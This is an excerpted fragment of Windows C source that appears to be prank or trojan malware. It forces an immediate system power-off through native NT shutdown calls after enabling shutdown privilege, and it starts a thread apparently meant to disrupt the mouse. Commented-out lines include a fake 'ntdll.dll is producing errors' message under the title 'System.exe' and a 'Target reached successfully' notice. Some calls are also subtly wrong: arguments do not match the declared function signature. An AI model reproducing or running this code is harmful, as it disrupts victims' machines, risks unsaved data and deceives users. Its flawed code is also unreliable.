...
forceOff( VOID )
{
	...
	NTSTATUS(NTAPI* NtSetSystemPowerState)(IN POWER_ACTION Power_state, IN BOOLEAN ResumeAlarm, IN BOOLEAN ForcePowerDown);
	...
	if (RtlAdjustPrivilege) {
		ntRet = RtlAdjustPrivilege(19, TRUE, FALSE, &WasEnabled);
		if (ntRet) {
			return MessageBoxA(NULL, "RtlAdjustPriv failed", "ATTENTION", MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}
	if (NtSetSystemPowerState) {
		ntRet = NtSetSystemPowerState(PowerActionShutdownOff, PowerSystemShutdown, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);
		if (!ntRet) {
			MessageBoxA(NULL, "NtSetSystemPowerState failed", "ATTENTION", MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}
	if (NtShutdownSystem) {
		ntRet = NtShutdownSystem(ShutdownPowerOff);
		if (!ntRet) {
			MessageBoxA(NULL, "NtShutdownSystem failed", "ATTENTION", MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}
	return TRUE;
...
)
{
	...
	//Sleep(15000);
	//MessageBoxA(NULL, "ntdll.dll is producing errors.", "System.exe", MB_ABORTRETRYIGNORE | MB_ICONERROR);
	Sleep( 10000 );
	...
	CloseHandle(CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)mouseMess, NULL, NULL, NULL));
...
//		return 0x00;
		forceOff( );
//		MessageBox(NULL, "Target reached successfully", "SUCCESS", MB_ICONINFORMATION | MB_OK);
	}
}
